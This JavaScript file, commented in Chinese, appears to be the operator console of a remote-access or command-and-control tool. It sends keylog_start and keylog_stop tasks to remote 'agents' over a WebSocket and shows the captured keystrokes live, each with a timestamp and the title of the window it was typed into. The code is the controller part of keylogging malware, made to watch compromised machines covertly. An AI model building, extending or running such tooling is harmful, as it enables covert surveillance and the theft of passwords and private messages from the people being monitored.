// 键盘记录面板：task_req keylog_start → task_result 批量按键 → 实时显示
const Keylog = {
    active: false,
    currentTaskId: "",

    start(agentId) {
        this.stop(agentId);
        Ws.sendJson({ type: "task_req", agentId, action: "keylog_start", payload: {} });
        $("keylog-status").textContent = "启动中...";
    },

    stop(agentId) {
        if (this.currentTaskId && this.active) {
            Ws.sendJson({ type: "task_req", agentId, action: "keylog_stop", payload: {} });
        }
        this.active = false;
        this.currentTaskId = "";
        $("keylog-status").textContent = "未启动";
    },

    clear() {
        $("keylog-body").innerHTML = "";
    },

    onMessage(msg) {
        if (msg.type !== "task_result") return false;
        // keylog_start 确认
        if (msg.action === "keylog_start") {
            if (msg.ok) {
                this.active = true;
                this.currentTaskId = msg.taskId || "";
                $("keylog-status").textContent = "录制中...";
            } else {
                this.active = false;
                this.currentTaskId = "";
                $("keylog-status").textContent = "启动失败: " + (msg.error || "未知错误");
            }
            return true;
        }
        if (msg.action === "keylog_stop") {
            this.active = false;
            this.currentTaskId = "";
            $("keylog-status").textContent = "已停止";
            return true;
        }
        // 批量按键数据（data 是 JSON 数组字符串）
        if (msg.action === "keylog_data" && msg.ok && msg.data) {
            try {
                const events = JSON.parse(msg.data);
                if (Array.isArray(events) && events.length > 0) this._appendEvents(events);
            } catch (e) {}
            return true;
        }
        return false;
    },

    _appendEvents(events) {
        const body = $("keylog-body");
        let lastWin = "";
        for (const ev of events) {
            const line = document.createElement("div");
            line.className = "keylog-line";
            const t = new Date(ev.ts);
            const ts = t.toLocaleTimeString();
            let html = `<span class="keylog-time">${ts}</span>`;
            // 窗口标题变化时显示
            if (ev.window && ev.window !== lastWin) {
                lastWin = ev.window;
                const short = ev.window.length > 30 ? ev.window.slice(0, 30) + "..." : ev.window;
                html += `<span class="keylog-win" title="${this._esc(ev.window)}">[${this._esc(short)}]</span>`;
            }
            html += `<span class="keylog-key">${this._esc(ev.key)}</span>`;
            line.innerHTML = html;
            body.appendChild(line);
        }
        // 自动滚到底部
        body.scrollTop = body.scrollHeight;
        // 限制最大行数
        while (body.children.length > 500) body.removeChild(body.firstChild);
    },

    _esc(s) {
        const d = document.createElement("div");
        d.textContent = s;
        return d.innerHTML;
    }
};
